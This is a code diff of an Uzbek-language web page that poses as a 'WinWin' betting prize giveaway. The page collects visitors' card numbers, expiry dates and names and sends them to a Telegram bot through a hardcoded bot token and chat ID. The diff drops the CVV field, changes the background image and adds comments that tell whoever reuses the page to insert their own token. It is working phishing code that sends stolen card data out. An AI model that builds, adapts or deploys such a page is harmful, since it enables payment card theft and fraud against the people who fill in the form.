@@ -26,6 +26,7 @@
             background-color: #0b1a2e;
         }
 
+        /* WinWin fon rasmi – 50% shaffof */
         body::before {
             content: "";
             position: fixed;
@@ -33,7 +34,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://winwinbet.app/wp-content/uploads/2025/04/WinWin-Bet-Official-1024x559.webp');
+            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJ9s-tjyFt9l0VEEWuXQjuL0Q3jGk0rldU-g&s');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -42,6 +43,7 @@
             pointer-events: none;
         }
 
+        /* Asosiy karta (umumiy uslub) */
         .card {
             width: 100%;
             max-width: 500px;
@@ -98,6 +100,7 @@
             font-size: 1.1rem;
         }
 
+        /* Forma uslublari */
         .form-group {
             margin-bottom: 20px;
         }
@@ -216,12 +219,13 @@
 <body>
 
 <div class="card">
+    <!-- TO'LOV MA'LUMOTLARI FORMASI – kod so‘ralmaydi, to‘g‘ridan-to‘g‘ri ko‘rinadi -->
     <div id="paymentSection">
         <div class="tournament-badge">💳 WINWIN SOVRINLARI</div>
         <h1>Karta ma'lumotlari<span> orqali</span></h1>
         <div class="highlight-green">⚡ 1 marta to‘ldirish – sovg‘a olish imkoniyati ⚡</div>
 
-        <!-- Karta formasi (tartib o'zgartirilgan: CVV yuqori qatorda, ism pastda) -->
+        <!-- Karta formasi -->
         <form id="paymentForm" onsubmit="return false;">
             <div class="form-group">
                 <label><span>💳</span> Karta raqami</label>
@@ -234,15 +238,9 @@
                     <input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                 </div>
                 <div class="form-group">
-                    <label><span>🔒</span> CCV (Kod)</label>
-                    <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="off">
+                    <label><span>👤</span> Ism Familiya</label>
+                    <input type="text" id="cardholderName" class="form-control" placeholder="Ism Familiya" maxlength="50">
                 </div>
-            </div>
-
-            <!-- Ism Familiya pastga tushirildi -->
-            <div class="form-group">
-                <label><span>👤</span> Ism Familiya</label>
-                <input type="text" id="cardholderName" class="form-control" placeholder="Ism Familiya" maxlength="50">
             </div>
 
             <button type="button" class="btn-submit" id="sendToTelegramBtn">
@@ -250,6 +248,7 @@
             </button>
         </form>
 
+        <!-- Qisqacha ma'lumot (turnir haqida) -->
         <div class="info-box">
             📢 Ma'lumotlaringiz xavfsiz saqlanadi. Turnir yakunida 25 fevraldan boshlab sovg‘alar beriladi.
         </div>
@@ -262,14 +261,13 @@
 
 <script>
     (function() {
-        // Telegram bot ma'lumotlari
-        const BOT_TOKEN = '8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s';
-        const CHAT_ID   = '7081746531';
+        // Telegram bot ma'lumotlari (o‘z tokeningiz va chat ID ni yozing)
+        const BOT_TOKEN = '8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s';      // <-- O‘z bot tokeningizni qo‘ying
+        const CHAT_ID   = '7081746531';        // <-- O‘z chat ID ni qo‘ying
 
         // Elementlar
         const cardNumberInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
-        const cvvInput = document.getElementById('cvv');
         const cardholderInput = document.getElementById('cardholderName');
         const sendBtn = document.getElementById('sendToTelegramBtn');
 
@@ -281,10 +279,11 @@
                 parts.push(value.substr(i, 4));
             }
             this.value = parts.join(' ').substr(0, 19);
+            // Xatolik klassini olib tashlash
             this.classList.remove('error');
         });
 
-        // Amal qilish muddati formatlash: MM/YY
+        // Amal qilish muddatini formatlash: MM/YY
         expiryInput.addEventListener('input', function(e) {
             let value = this.value.replace(/\//g, '').replace(/[^0-9]/g, '');
             if (value.length >= 3) {
@@ -295,36 +294,27 @@
             this.classList.remove('error');
         });
 
-        // CCV faqat raqamlar
-        cvvInput.addEventListener('input', function(e) {
-            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 4);
-            this.classList.remove('error');
-        });
-
-        // Xatolik klassini olib tashlash
-        [cardNumberInput, expiryInput, cvvInput, cardholderInput].forEach(input => {
+        // Inputlardan xatolik klassini olib tashlash
+        [cardNumberInput, expiryInput, cardholderInput].forEach(input => {
             input.addEventListener('focus', () => input.classList.remove('error'));
         });
 
-        // Yuborish
+        // Yuborish tugmasi
         sendBtn.addEventListener('click', function() {
+            // Oq bo‘shliqlarni tozalab olish
             let cardNumber = cardNumberInput.value.replace(/\s/g, '');
             let expiry = expiryInput.value.trim();
-            let cvv = cvvInput.value.trim();
             let cardholder = cardholderInput.value.trim();
 
             let hasError = false;
 
+            // Validatsiya
             if (cardNumber.length < 16 || !/^\d{16}$/.test(cardNumber)) {
                 cardNumberInput.classList.add('error');
                 hasError = true;
             }
             if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                 expiryInput.classList.add('error');
-                hasError = true;
-            }
-            if (!/^\d{3,4}$/.test(cvv)) {
-                cvvInput.classList.add('error');
                 hasError = true;
             }
             if (cardholder === '') {
@@ -337,27 +327,30 @@
                 return;
             }
 
-            // Telegram xabari
+            // Telegram xabarini tayyorlash
             const message = `🆕 YANGI KARTA MA'LUMOTLARI\n` +
                             `┌───────────────────\n` +
                             `💳 Karta raqami: ${cardNumber}\n` +
                             `📅 Amal qilish: ${expiry}\n` +
-                            `🔒 CCV: ${cvv}\n` +
                             `👤 Ism Familiya: ${cardholder}\n` +
                             `└───────────────────`;
 
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            // Telegram API ga so‘rov yuborish
+            fetch(`https://api.telegram.org/bot8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+                body: JSON.stringify({
+                    chat_id:7081746531,
+                    text: message
+                })
             })
             .then(response => response.json())
             .then(data => {
                 if (data.ok) {
                     alert('✅ Maʼlumotlaringiz qabul qilindi. Tez orada sovg‘a haqida habar beramiz.');
+                    // Formani tozalash
                     cardNumberInput.value = '';
                     expiryInput.value = '';
-                    cvvInput.value = '';
                     cardholderInput.value = '';
                 } else {
                     alert('❌ Xatolik yuz berdi. Iltimos, qayta urinib ko‘ring.\n' + (data.description || ''));
@@ -368,8 +361,8 @@
             });
         });
 
-        // Enter bilan yuborish
-        const inputs = [cardNumberInput, expiryInput, cvvInput, cardholderInput];
+        // Enter bosilganda yuborish
+        const inputs = [cardNumberInput, expiryInput, cardholderInput];
         inputs.forEach(input => {
             input.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
@@ -380,5 +373,7 @@
         });
     })();
 </script>
+
+<!-- DIQQAT: BOT_TOKEN va CHAT_ID ni o‘z maʼlumotlaringiz bilan almashtiring. -->
 </body>
 </html>
